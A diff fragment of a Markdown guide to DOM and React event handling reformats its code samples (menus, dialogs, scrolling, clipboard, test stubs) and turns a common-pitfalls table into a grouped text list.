-  const btnRef = useRef(null), menuRef = useRef(null);
+  const btnRef = useRef(null),
+    menuRef = useRef(null);
   useClickOutside([btnRef, menuRef], () => setOpen(false), open);
 
-  function close() { setOpen(false); btnRef.current?.focus(); }   // ‼️ return focus
+  function close() {
+    setOpen(false);
+    btnRef.current?.focus();
+  } // ‼️ return focus
 
   // Focus the menu when it opens so arrow keys go to it
-  useEffect(() => { if (open) menuRef.current?.focus(); }, [open]);
+  useEffect(() => {
+    if (open) menuRef.current?.focus();
+  }, [open]);
 
   return (
-    <div className="menu-root">
-      <button ref={btnRef} type="button" aria-haspopup="menu" aria-expanded={open}
+    <div className='menu-root'>
+      <button
+        ref={btnRef}
+        type='button'
+        aria-haspopup='menu'
+        aria-expanded={open}
         onClick={() => setOpen(o => !o)}
-        onKeyDown={(e) => { if (e.key === 'ArrowDown') { e.preventDefault(); setOpen(true); } }}>
+        onKeyDown={e => {
+          if (e.key === 'ArrowDown') {
+            e.preventDefault();
+            setOpen(true);
+          }
+        }}
+      >
         {label}
       </button>
       {open && (
-        <ul ref={menuRef} role="menu" tabIndex={-1}
-          onKeyDown={(e) => {
+        <ul
+          ref={menuRef}
+          role='menu'
+          tabIndex={-1}
+          onKeyDown={e => {
             if (e.key === 'Escape') close();
-            if (e.key === 'ArrowDown') { e.preventDefault(); setActive(i => (i + 1) % items.length); }
-            if (e.key === 'ArrowUp') { e.preventDefault(); setActive(i => (i - 1 + items.length) % items.length); }
-            if (e.key === 'Enter') { items[active].onSelect(); close(); }
-          }}>
+            if (e.key === 'ArrowDown') {
+              e.preventDefault();
+              setActive(i => (i + 1) % items.length);
+            }
+            if (e.key === 'ArrowUp') {
+              e.preventDefault();
+              setActive(i => (i - 1 + items.length) % items.length);
+            }
+            if (e.key === 'Enter') {
+              items[active].onSelect();
+              close();
+            }
+          }}
+        >
           {items.map((it, i) => (
-            <li key={it.id} role="menuitem" aria-selected={i === active}
-              onMouseDown={(e) => e.preventDefault()}   // keep focus; avoid blur-before-click (§12)
-              onClick={() => { it.onSelect(); close(); }}>
+            <li
+              key={it.id}
+              role='menuitem'
+              aria-selected={i === active}
+              onMouseDown={e => e.preventDefault()} // keep focus; avoid blur-before-click (§12)
+              onClick={() => {
+                it.onSelect();
+                close();
+              }}
+            >
               {it.label}
             </li>
           ))}
@@ -2551,21 +2961,28 @@ function Menu({ label, items }) {
 function InfiniteList({ items, hasMore, loadMore }) {
   const sentinelRef = useRef(null);
   const loadMoreRef = useRef(loadMore);
-  useLayoutEffect(() => { loadMoreRef.current = loadMore; });
+  useLayoutEffect(() => {
+    loadMoreRef.current = loadMore;
+  });
 
   useEffect(() => {
     if (!hasMore) return;
-    const io = new IntersectionObserver(([entry]) => {
-      if (entry.isIntersecting) loadMoreRef.current();
-    }, { rootMargin: '400px' });            // start loading before the user reaches the end
+    const io = new IntersectionObserver(
+      ([entry]) => {
+        if (entry.isIntersecting) loadMoreRef.current();
+      },
+      { rootMargin: '400px' },
+    ); // start loading before the user reaches the end
     io.observe(sentinelRef.current);
     return () => io.disconnect();
   }, [hasMore]);
 
   return (
     <ul>
-      {items.map(i => <li key={i.id}>{i.title}</li>)}
-      {hasMore && <li ref={sentinelRef} aria-hidden="true" />}
+      {items.map(i => (
+        <li key={i.id}>{i.title}</li>
+      ))}
+      {hasMore && <li ref={sentinelRef} aria-hidden='true' />}
     </ul>
   );
 }
@@ -2578,19 +2995,24 @@ function InfiniteList({ items, hasMore, loadMore }) {
 ```jsx
 function ChatLog({ messages }) {
   const ref = useRef(null);
-  const stick = useRef(true);           // were we at the bottom before this update?
+  const stick = useRef(true); // were we at the bottom before this update?
 
   function onScroll() {
     const el = ref.current;
     stick.current = el.scrollHeight - el.scrollTop - el.clientHeight < 40;
   }
-  useLayoutEffect(() => {               // before paint → no visible jump
+  useLayoutEffect(() => {
+    // before paint → no visible jump
     if (stick.current) ref.current.scrollTop = ref.current.scrollHeight;
   }, [messages]);
 
-  return <div ref={ref} onScroll={onScroll} style={{ overflowY: 'auto', height: 400 }}>
-    {messages.map(m => <p key={m.id}>{m.text}</p>)}
-  </div>;
+  return (
+    <div ref={ref} onScroll={onScroll} style={{ overflowY: 'auto', height: 400 }}>
+      {messages.map(m => (
+        <p key={m.id}>{m.text}</p>
+      ))}
+    </div>
+  );
 }
 ```
 
@@ -2601,8 +3023,8 @@ function AutoTextarea(props) {
   const ref = useRef(null);
   useLayoutEffect(() => {
     const el = ref.current;
-    el.style.height = 'auto';                    // shrink first so it can get smaller
-    el.style.height = `${el.scrollHeight}px`;    // then fit the content
+    el.style.height = 'auto'; // shrink first so it can get smaller
+    el.style.height = `${el.scrollHeight}px`; // then fit the content
   }, [props.value]);
   return <textarea ref={ref} rows={1} {...props} />;
 }
@@ -2617,13 +3039,19 @@ function CopyButton({ text }) {
   useEffect(() => {
     if (!copied) return;
     const id = setTimeout(() => setCopied(false), 1500);
-    return () => clearTimeout(id);               // ‼️ no setState after unmount
+    return () => clearTimeout(id); // ‼️ no setState after unmount
   }, [copied]);
   return (
-    <button type="button" onClick={async () => {
-      await navigator.clipboard.writeText(text);
-      setCopied(true);
-    }} aria-live="polite">{copied ? 'Copied' : 'Copy'}</button>
+    <button
+      type='button'
+      onClick={async () => {
+        await navigator.clipboard.writeText(text);
+        setCopied(true);
+      }}
+      aria-live='polite'
+    >
+      {copied ? 'Copied' : 'Copy'}
+    </button>
   );
 }
 ```
@@ -2640,12 +3068,14 @@ function StickyHeader({ children }) {
     io.observe(sentinel.current);
     return () => io.disconnect();
   }, []);
-  return (<>
-    <div ref={sentinel} style={{ height: 1 }} />
-    <header className={stuck ? 'header stuck' : 'header'} style={{ position: 'sticky', top: 0 }}>
-      {children}
-    </header>
-  </>);
+  return (
+    <>
+      <div ref={sentinel} style={{ height: 1 }} />
+      <header className={stuck ? 'header stuck' : 'header'} style={{ position: 'sticky', top: 0 }}>
+        {children}
+      </header>
+    </>
+  );
 }
 ```
 
@@ -2654,7 +3084,7 @@ function StickyHeader({ children }) {
 ```jsx
 function useLongPress(onLongPress, ms = 500) {
   const timer = useRef(0);
-  const start = (e) => {
+  const start = e => {
     timer.current = window.setTimeout(() => onLongPress(e), ms);
   };
   const cancel = () => clearTimeout(timer.current);
@@ -2662,8 +3092,8 @@ function useLongPress(onLongPress, ms = 500) {
     onPointerDown: start,
     onPointerUp: cancel,
     onPointerLeave: cancel,
-    onPointerCancel: cancel,       // scrolling started
-    onContextMenu: (e) => e.preventDefault(),   // mobile long-press opens a menu otherwise
+    onPointerCancel: cancel, // scrolling started
+    onContextMenu: e => e.preventDefault(), // mobile long-press opens a menu otherwise
   };
 }
 // <button {...useLongPress(() => openActions())}>Hold me</button>
@@ -2707,15 +3137,24 @@ function ConfirmDialog({ open, onClose, onConfirm, children }) {
   }, [open]);
 
   return (
-    <dialog ref={ref}
-      onClose={onClose}                        // Escape and close() both end here
-      onClick={(e) => {                        // click on the backdrop closes:
-        if (e.target === e.currentTarget) onClose();   // the backdrop click targets <dialog> itself
-      }}>
-      <form method="dialog">                   {/* ‼️ submitting closes the dialog, no JS */}
+    <dialog
+      ref={ref}
+      onClose={onClose} // Escape and close() both end here
+      onClick={e => {
+        // click on the backdrop closes:
+        if (e.target === e.currentTarget) onClose(); // the backdrop click targets <dialog> itself
+      }}
+    >
+      <form method='dialog'>
+        {' '}
+        {/* ‼️ submitting closes the dialog, no JS */}
         {children}
-        <button value="cancel" formNoValidate>Cancel</button>
-        <button value="ok" onClick={onConfirm}>OK</button>
+        <button value='cancel' formNoValidate>
+          Cancel
+        </button>
+        <button value='ok' onClick={onConfirm}>
+          OK
+        </button>
       </form>
     </dialog>
   );
@@ -2743,24 +3182,38 @@ POSITIONING FLOATING UI WITH JS (tooltips, dropdowns, comboboxes):
 ```tsx
 // ── React synthetic event types (generic = the element the handler is on) ───
 function onClick(e: React.MouseEvent<HTMLButtonElement>) {
-  e.currentTarget;            // HTMLButtonElement ✅ typed
-  e.target;                   // EventTarget ‼️ not typed — could be any child
+  e.currentTarget; // HTMLButtonElement ✅ typed
+  e.target; // EventTarget ‼️ not typed — could be any child
 }
 function onChange(e: React.ChangeEvent<HTMLInputElement>) {
-  e.target.value;             // string ✅ (for ChangeEvent, target IS typed)
+  e.target.value; // string ✅ (for ChangeEvent, target IS typed)
   e.target.checked;
 }
-function onSelect(e: React.ChangeEvent<HTMLSelectElement>) { e.target.value; }
-function onKeyDown(e: React.KeyboardEvent<HTMLInputElement>) { e.key; }
+function onSelect(e: React.ChangeEvent<HTMLSelectElement>) {
+  e.target.value;
+}
+function onKeyDown(e: React.KeyboardEvent<HTMLInputElement>) {
+  e.key;
+}
 function onSubmit(e: React.FormEvent<HTMLFormElement>) {
   e.preventDefault();
   new FormData(e.currentTarget);
 }
-function onFocus(e: React.FocusEvent<HTMLDivElement>) { e.relatedTarget; } // Element | null
-function onPointer(e: React.PointerEvent<HTMLDivElement>) { e.pointerType; }
-function onDrop(e: React.DragEvent<HTMLDivElement>) { e.dataTransfer.files; }
-function onWheel(e: React.WheelEvent) { e.deltaY; }
-function onPaste(e: React.ClipboardEvent) { e.clipboardData.getData('text'); }
+function onFocus(e: React.FocusEvent<HTMLDivElement>) {
+  e.relatedTarget;
+} // Element | null
+function onPointer(e: React.PointerEvent<HTMLDivElement>) {
+  e.pointerType;
+}
+function onDrop(e: React.DragEvent<HTMLDivElement>) {
+  e.dataTransfer.files;
+}
+function onWheel(e: React.WheelEvent) {
+  e.deltaY;
+}
+function onPaste(e: React.ClipboardEvent) {
+  e.clipboardData.getData('text');
+}
 
 // Handler type shortcuts (for props)
 type Props = {
@@ -2844,12 +3297,14 @@ useEffect(() => {
   fetch(`/api/tasks/${id}`, { signal })
     .then(r => r.json())
     .then(setTask)
-    .catch(err => { if (err.name !== 'AbortError') setError(err); });
+    .catch(err => {
+      if (err.name !== 'AbortError') setError(err);
+    });
 
   window.addEventListener('online', refetch, { signal });
   document.addEventListener('visibilitychange', onVisibility, { signal });
 
-  return () => ac.abort();   // cancels the request AND removes both listeners
+  return () => ac.abort(); // cancels the request AND removes both listeners
 }, [id]);
 // Bonus: aborting on id change prevents a slow old response overwriting a newer one
 // (race condition).
@@ -2969,16 +3424,28 @@ TEST ENVIRONMENT FACTS (Vitest/Jest + jsdom or happy-dom)
 ```ts
 // vitest.setup.ts — common stubs
 class ResizeObserverStub {
-  observe() {} unobserve() {} disconnect() {}
+  observe() {}
+  unobserve() {}
+  disconnect() {}
 }
 globalThis.ResizeObserver ??= ResizeObserverStub as any;
 globalThis.IntersectionObserver ??= class {
-  observe() {} unobserve() {} disconnect() {} takeRecords() { return []; }
+  observe() {}
+  unobserve() {}
+  disconnect() {}
+  takeRecords() {
+    return [];
+  }
 } as any;
 window.matchMedia ??= ((query: string) => ({
-  matches: false, media: query, onchange: null,
-  addEventListener() {}, removeEventListener() {},
-  addListener() {}, removeListener() {}, dispatchEvent: () => false,
+  matches: false,
+  media: query,
+  onchange: null,
+  addEventListener() {},
+  removeEventListener() {},
+  addListener() {},
+  removeListener() {},
+  dispatchEvent: () => false,
 })) as any;
 Element.prototype.scrollIntoView ??= function () {};
 ```
@@ -2993,7 +3460,7 @@ import userEvent from '@testing-library/user-event';
 
 test('closes the menu on Escape and returns focus', async () => {
   const user = userEvent.setup();
-  render(<Menu label="Actions" items={items} />);
+  render(<Menu label='Actions' items={items} />);
   const trigger = screen.getByRole('button', { name: 'Actions' });
 
   await user.click(trigger);
@@ -3022,38 +3489,151 @@ More: [REACT-TESTING-BASICS.md](REACT-TESTING-BASICS.md).
 
 ## 37. Common Pitfalls
 
-| Symptom | Cause | Fix |
-|---|---|---|
-| Listener never removed | Different function reference, or `capture` mismatch | Keep the reference; or `{ signal }` + `abort()` |
-| Handler reads old state | Listener created once in `useEffect(..., [])` | Functional update, deps, `useEffectEvent`, latest-ref (§26) |
-| Listeners fire twice in dev | StrictMode re-runs effects; cleanup missing | Return a correct cleanup |
-| `e.target.dataset.id` undefined | Clicked a child (icon/span) | `e.currentTarget`, or `e.target.closest('[data-id]')` |
-| `e.currentTarget` is null | Read after `await` / later | Save it to a variable first |
-| Form reloads the page | No `preventDefault` in submit | `e.preventDefault()` in `onSubmit` |
-| "Cancel" button submits the form | `<button>` defaults to `type="submit"` | `type="button"` |
-| Clicking a dropdown option does nothing | Input blur closes the menu before click (§12) | `onMouseDown={e => e.preventDefault()}` on options |
-| Enter submits half-typed Chinese/Japanese | IME composition | Ignore when `isComposing` / `keyCode === 229` (§11) |
-| `preventDefault` on wheel/touch ignored + warning | Passive listener (browser default / React) | Native listener with `{ passive: false }` (§9) |
-| `onClick` in React suddenly never fires | A native listener inside called `stopPropagation` | Find it via Event Listeners panel; avoid stopPropagation |
-| Click-outside closes on clicks inside a submenu | Submenu is in a portal, not inside the container DOM | Include portal ref in the check (§28) |
-| Sizes are 0 | Element is `display:none`, not mounted yet, or in jsdom | Measure in `useLayoutEffect` after render; test in a real browser |
-| Tooltip flickers into place | Measured in `useEffect` (after paint) | `useLayoutEffect` (§27) |
-| Page is janky while scrolling | Heavy scroll handler, layout read/write mix | rAF-throttle, passive, IntersectionObserver, CSS (§15, §18) |
-| `scrollIntoView` moves the whole page | It scrolls all ancestors | `block: 'nearest'`, or set `container.scrollTop` |
-| Element scroll not seen by parent's `onScroll` | Scroll doesn't bubble | Attach to the scrolling element; or capture listener |
-| Debounce doesn't debounce in React | New debounced function each render | `useMemo`/`useRef`, or debounce the value (§20) |
-| `window is not defined` | Browser API used during SSR render | Move into `useEffect`; `useSyncExternalStore` server snapshot (§29) |
-| Hydration mismatch | Render reads `window`, `localStorage`, `Date.now()` | Stable default + update after mount (§29) |
-| `removeChild` / `insertBefore` errors in React | Something else mutated React's DOM (you, an extension, Google Translate) | Don't mutate React-owned nodes; give libraries their own empty container |
-| `setAttribute('disabled', 'false')` still disabled | Boolean attribute presence | `el.disabled = false` / `removeAttribute` |
-| Typed value lost when setting `input.value` from JS | No event fired; React state not updated | Change React state instead |
-| Cmd+click on your links doesn't open new tab | `preventDefault` on all clicks | Skip when modifier keys / non-left button (§10) |
-| Drop never fires | No `preventDefault` in `dragover` | Add it (§23) |
-| `getData()` empty during dragover | Privacy rule — only readable on drop | Use `dataTransfer.types` until drop |
-| Touch drag cancels after a few px | Browser took over scrolling → `pointercancel` | `touch-action: none` on the handle (§10) |
-| Hover style "sticks" after tap on phone | Emulated mouseover on touch | `@media (hover: hover)` around hover styles |
-| `navigator.clipboard` undefined | Not HTTPS / not in a user gesture | Serve over HTTPS; call from the click handler |
-| Dialog content clickable behind modal | Using a div overlay without inert | `<dialog>.showModal()` (§31) |
+```text
+  Each entry:  ✗ symptom
+                 why  → the cause
+                 fix  → what to do
+
+  ── LISTENERS & HANDLERS ──────────────────────────────────────────────────────────
+
+  ✗ Listener never removed
+      why  → different function reference, or `capture` mismatch
+      fix  → keep the same reference; or { signal } + controller.abort()
+
+  ✗ Handler reads old state
+      why  → listener created once in useEffect(..., [])
+      fix  → functional update, deps, useEffectEvent, or latest-ref (§26)
+
+  ✗ Listeners fire twice in dev
+      why  → StrictMode re-runs effects; cleanup is missing
+      fix  → return a correct cleanup
+
+  ✗ e.target.dataset.id is undefined
+      why  → you clicked a child (icon / span)
+      fix  → e.currentTarget, or e.target.closest('[data-id]')
+
+  ✗ e.currentTarget is null
+      why  → read after an await / later
+      fix  → save it to a variable first
+
+  ✗ ‼️ onClick in React suddenly never fires
+      why  → a native listener inside called stopPropagation
+      fix  → find it via the Event Listeners panel; avoid stopPropagation
+
+  ✗ Debounce doesn't debounce in React
+      why  → a new debounced function on every render
+      fix  → useMemo / useRef, or debounce the value (§20)
+
+
+  ── FORMS & INPUT ─────────────────────────────────────────────────────────────────
+
+  ✗ Form reloads the page
+      why  → no preventDefault in submit
+      fix  → e.preventDefault() in onSubmit
+
+  ✗ ‼️ "Cancel" button submits the form
+      why  → <button> defaults to type="submit"
+      fix  → type="button"
+
+  ✗ ‼️ Enter submits half-typed Chinese / Japanese
+      why  → IME composition is still in progress
+      fix  → ignore when isComposing / keyCode === 229 (§11)
+
+  ✗ Typed value lost when setting input.value from JS
+      why  → no event fired, so React state didn't update
+      fix  → change the React state instead
+
+  ✗ setAttribute('disabled', 'false') is still disabled
+      why  → boolean attributes work by presence, the string doesn't matter
+      fix  → el.disabled = false, or removeAttribute('disabled')
+
+
+  ── FOCUS, CLICKS & MENUS ─────────────────────────────────────────────────────────
+
+  ✗ ‼️ Clicking a dropdown option does nothing
+      why  → the input's blur closes the menu before the click lands (§12)
+      fix  → onMouseDown={e => e.preventDefault()} on the options
+
+  ✗ Click-outside closes on clicks inside a submenu
+      why  → the submenu is in a portal, not inside the container's DOM
+      fix  → include the portal's ref in the check (§28)
+
+  ✗ Cmd+click on your links doesn't open a new tab
+      why  → preventDefault on every click
+      fix  → skip when a modifier key is held / not the left button (§10)
+
+  ✗ Dialog content behind the modal is still clickable
+      why  → a div overlay without inert
+      fix  → <dialog>.showModal() (§31)
+
+
+  ── SCROLL, WHEEL & TOUCH ─────────────────────────────────────────────────────────
+
+  ✗ ‼️ preventDefault on wheel/touch ignored + console warning
+      why  → passive listener (browser default / React)
+      fix  → native listener with { passive: false } (§9)
+
+  ✗ Page is janky while scrolling
+      why  → heavy scroll handler, layout reads and writes mixed
+      fix  → rAF-throttle, passive, IntersectionObserver, CSS (§15, §18)
+
+  ✗ scrollIntoView moves the whole page
+      why  → it scrolls ALL scrollable ancestors
+      fix  → block: 'nearest', or set container.scrollTop yourself
+
+  ✗ Parent's onScroll doesn't see a child element scrolling
+      why  → scroll doesn't bubble
+      fix  → attach to the scrolling element; or use a capture listener
+
+  ✗ Touch drag cancels after a few pixels
+      why  → the browser took over scrolling → pointercancel
+      fix  → touch-action: none on the handle (§10)
+
+  ✗ Hover style "sticks" after a tap on a phone
+      why  → touch emulates mouseover
+      fix  → wrap hover styles in @media (hover: hover)
+
+
+  ── LAYOUT & MEASURING ────────────────────────────────────────────────────────────
+
+  ✗ Sizes are 0
+      why  → element is display:none, not mounted yet, or running in jsdom
+      fix  → measure in useLayoutEffect after render; test in a real browser
+
+  ✗ Tooltip flickers into place
+      why  → measured in useEffect (after paint)
+      fix  → useLayoutEffect (§27)
+
+
+  ── SSR & REACT'S DOM ─────────────────────────────────────────────────────────────
+
+  ✗ window is not defined
+      why  → a browser API used during the SSR render
+      fix  → move it into useEffect; useSyncExternalStore server snapshot (§29)
+
+  ✗ Hydration mismatch
+      why  → render reads window, localStorage, Date.now()
+      fix  → render a stable default, update after mount (§29)
+
+  ✗ ‼️ removeChild / insertBefore errors in React
+      why  → something else changed React's DOM (you, an extension, Google Translate)
+      fix  → don't touch React-owned nodes; give libraries their own empty container
+
+
+  ── DRAG & DROP, CLIPBOARD ────────────────────────────────────────────────────────
+
+  ✗ Drop never fires
+      why  → no preventDefault in dragover
+      fix  → add it (§23)
+
+  ✗ getData() is empty during dragover
+      why  → privacy rule — data is only readable on drop
+      fix  → use dataTransfer.types until the drop
+
+  ✗ navigator.clipboard is undefined / fails
+      why  → not HTTPS, or not inside a user gesture
+      fix  → serve over HTTPS; call it from the click handler
+```
 
 ---
 
